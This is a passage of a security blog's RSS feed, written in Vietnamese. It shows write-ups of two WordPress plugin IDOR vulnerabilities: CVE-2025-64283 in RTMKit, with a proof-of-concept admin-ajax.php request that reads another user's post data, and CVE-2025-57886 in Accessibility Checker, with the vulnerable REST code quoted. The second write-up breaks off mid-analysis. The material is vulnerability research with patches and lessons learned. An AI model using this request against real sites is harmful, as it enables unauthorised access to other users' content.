disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Lỗ hổng xuất hiện khi &lt;code&gt;$id&lt;/code&gt; không được kiểm soát chặt, khiến người dùng &lt;strong&gt;Contributor+&lt;/strong&gt; có thể lấy bất cứ dữ liệu post nào của người dùng khác.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá v1.6.8&lt;/strong&gt; bổ sung bước kiểm tra quyền người dùng bằng &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;    wp_send_json_error(&amp;#39;Access Denied: Insufficient permissions&amp;#39;);&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đảm bảo chỉ những user có quyền &lt;strong&gt;Administrator&lt;/strong&gt; mới được phép tiếp tục xử lý. Nếu người dùng không đủ quyền, request sẽ bị từ chối ngay và trả về thông báo lỗi &lt;code&gt;Access Denied: Insufficient permissions&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Contributor&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;action=get_template_content&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;get_template_content() executed&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;check_ajax_referer passed&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Control template ID parameter&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post_meta(target_id, _elementor_data)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Return template content&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo post bằng &lt;strong&gt;Elementor&lt;/strong&gt; với &lt;strong&gt;Contributor+ user&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Bắt request bằng BurpSuite và lấy giá trị nonce được trả về:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script id=&amp;#34;rkit-library-script-js-extra&amp;#34;&amp;gt;&#xA;    var rkit_libs = {&amp;#34;logo_url&amp;#34;:&amp;#34;http://localhost/wp-content/plugins/rometheme-for-elementor//view/images/RTMKitNew.png&amp;#34;,&amp;#34;ajax_url&amp;#34;:&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34;,&amp;#34;template_nonce&amp;#34;:&amp;#34;nonce_value&amp;#34;};&#xA;    //# sourceURL=rkit-library-script-js-extra&#xA;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Gửi request với &lt;code&gt;template=id_of_other_post&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: contributor_cookie&#xA;&#xA;action=get_template_content&amp;amp;wpnonce=bea52715a7&amp;amp;template=25&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; title=&#34;Administrator post content&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; data-sub-html=&#34;&lt;h2&gt;Administrator post&lt;/h2&gt;&lt;p&gt;Administrator post content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#39; alt=&#34;Administrator post&#34; height=&#34;799&#34; width=&#34;1412&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Administrator post content&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Một số Ajax khác cũng tồn tại lỗ hổng này&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_lib&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_envato_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_templates&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_template_category&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64283 xuất phát từ việc plugin chỉ dựa vào &lt;strong&gt;nonce&lt;/strong&gt; để xác thực request AJAX mà không thực hiện &lt;strong&gt;kiểm tra quyền truy cập theo vai trò người dùng&lt;/strong&gt;. Điều này cho phép người dùng có quyền thấp hơn (Contributor+) kiểm soát tham số &lt;code&gt;template&lt;/code&gt; và truy xuất dữ liệu &lt;code&gt;_elementor_data&lt;/code&gt; của các post không thuộc quyền sở hữu của họ. Bản vá v1.6.8 đã khắc phục vấn đề bằng cách bổ sung kiểm tra quyền quản trị, ngăn chặn việc truy cập trái phép.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce &lt;strong&gt;không thay thế&lt;/strong&gt; cho kiểm soát quyền truy cập (authorization).&lt;/li&gt;&#xA;&lt;li&gt;AJAX action trong WordPress cần &lt;strong&gt;kiểm tra capability phù hợp&lt;/strong&gt;, không chỉ kiểm tra đăng nhập.&lt;/li&gt;&#xA;&lt;li&gt;Các tham số định danh đối tượng (ID) do người dùng kiểm soát cần được &lt;strong&gt;ràng buộc quyền truy cập rõ ràng&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR thường xuất hiện trong các logic AJAX bị cấu hình kiểm soát truy cập không đầy đủ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-rtmkit-plugin-1-6-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin &amp;lt;= 1.6.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-57886 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-22-cve-2025-57886/</link>
      <pubDate>Mon, 22 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-22-cve-2025-57886/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;bỏ qua cơ chế phân quyền (Authorization Bypass) thông qua khóa do người dùng kiểm soát&lt;/strong&gt; trong plugin &lt;strong&gt;Equalize Digital Accessibility Checker&lt;/strong&gt; của &lt;strong&gt;Equalize Digital&lt;/strong&gt; cho phép khai thác việc &lt;strong&gt;cấu hình sai các mức kiểm soát truy cập&lt;/strong&gt;. Lỗ hổng này ảnh hưởng đến &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; từ phiên bản &lt;strong&gt;không xác định&lt;/strong&gt; đến &lt;strong&gt;1.30.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-57886&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-57886&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.30.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.30.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/accessibility-checker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.30.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.30.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function init_rest_routes() {&#xA;    $ns      = &amp;#39;accessibility-checker/&amp;#39;;&#xA;    $version = &amp;#39;v1&amp;#39;;&#xA;&#xA;    add_action(&#xA;        &amp;#39;rest_api_init&amp;#39;,&#xA;        function () use ( $ns, $version ) {&#xA;            register_rest_route(&#xA;                $ns . $version,&#xA;                &amp;#39;/post-scan-results/(?P&amp;lt;id&amp;gt;\d&amp;#43;)&amp;#39;,&#xA;                [&#xA;                    &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;                    &amp;#39;callback&amp;#39;            =&amp;gt; [ $this, &amp;#39;set_post_scan_results&amp;#39; ],&#xA;                    &amp;#39;args&amp;#39;                =&amp;gt; [&#xA;                        &amp;#39;id&amp;#39; =&amp;gt; [&#xA;                            &amp;#39;validate_callback&amp;#39; =&amp;gt; function ( $param ) {&#xA;                                return is_numeric( $param );&#xA;                            },&#xA;                        ],&#xA;                    ],&#xA;                    &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                        return current_user_can( &amp;#39;edit_posts&amp;#39; );&#xA;                    },&#xA;                ]&#xA;            );&#xA;        }&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nhìn vào logic của đoạn code, chúng ta có thể rút ra một số điểm quan trọng:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Namespace và route&lt;/strong&gt;&#xA;Endpoint được đặt dưới &lt;code&gt;accessibility-checker/v1&lt;/code&gt; với route &lt;code&gt;/post-scan-results/{id}&lt;/code&gt;. Tham số &lt;code&gt;id&lt;/code&gt; được định nghĩa là &lt;strong&gt;số&lt;/strong&gt;, nhờ regex &lt;code&gt;\d+&lt;/code&gt; và &lt;code&gt;validate_callback&lt;/code&gt;. Đây là một bước kiểm tra cơ bản, nhưng chưa hề kiểm tra xem &lt;code&gt;id&lt;/code&gt; có tồn tại hay thuộc post type nào.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Phương thức HTTP&lt;/strong&gt;&#xA;Route chỉ chấp nhận &lt;code&gt;POST&lt;/code&gt;, gợi ý rằng đây là endpoint &lt;strong&gt;ghi hoặc cập nhật dữ liệu&lt;/strong&gt;, không phải chỉ đọc.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra quyền&lt;/strong&gt;&#xA;&lt;code&gt;permission_callback&lt;/code&gt; chỉ kiểm tra capability tổng quát &lt;code&gt;edit_posts&lt;/code&gt; (Contributor+). Quyết định cho phép hay từ chối request &lt;strong&gt;không dựa vào post cụ thể&lt;/strong&gt;, tức là &lt;strong&gt;user có quyền tổng quát sẽ được phép thao tác với bất kỳ &lt;code&gt;id&lt;/code&gt; nào&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Callback xử lý&lt;/strong&gt;&#xA;Nếu vượt qua permission, WordPress gọi &lt;code&gt;set_post_scan_results&lt;/code&gt; với &lt;code&gt;$id&lt;/code&gt; do client cung cấp. Tại đây, toàn bộ logic xử lý dữ liệu hoàn toàn &lt;strong&gt;tin vào giá trị &lt;code&gt;id&lt;/code&gt; mà client kiểm soát&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function set_post_scan_results( $request ) {&#xA;    if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;A required parameter is missing.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    $post    = get_post( $post_id );&#xA;    if ( ! is_object( $post ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post is not valid.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_type  = get_post_type( $post );&#xA;    $post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;    if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post type is not set to be scanned.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $rules = edac_register_rules();&#xA;    $js_rule_ids = [];&#xA;    $combined_rule_ids = [];&#xA;    ...&#xA;&#xA;    try {&#xA;        do_action( &amp;#39;edac_before_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;&#xA;        $violations = $request[&amp;#39;violations&amp;#39;];&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 1, &amp;#39;js&amp;#39; );&#xA;&#xA;        if ( is_array( $violations ) &amp;amp;&amp;amp; count( $violations ) &amp;gt; 0 ) {&#xA;            foreach ( $violations as $violation ) {&#xA;                $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;                $actual_rule_id = $combined_rule_ids[ $rule_id ] ?? $rule_id;&#xA;                if ( in_array( $actual_rule_id, $js_rule_ids, true ) ) {&#xA;                    ...&#xA;                    ( new Insert_Rule_Data() )-&amp;gt;insert( $post, $actual_rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;                    ...&#xA;                }&#xA;            }&#xA;        }&#xA;&#xA;        do_action( &amp;#39;edac_after_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 2, &amp;#39;js&amp;#39; );&#xA;&#xA;        $metrics = $request[&amp;#39;densityMetrics&amp;#39;] ?? [ 0, 0 ];&#xA;        update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;&#xA;        ( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;        update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&#xA;&#xA;        do_action( &amp;#39;edac_validate_before_sending_rest_response&amp;#39;, $post_id, &amp;#39;js&amp;#39;, $request );&#xA;&#xA;        return new \WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;id&amp;#39; =&amp;gt; $post_id, &amp;#39;timestamp&amp;#39; =&amp;gt; time() ] );&#xA;&#xA;    } catch ( \Exception $ex ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; $ex-&amp;gt;getMessage() ], 500 );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm 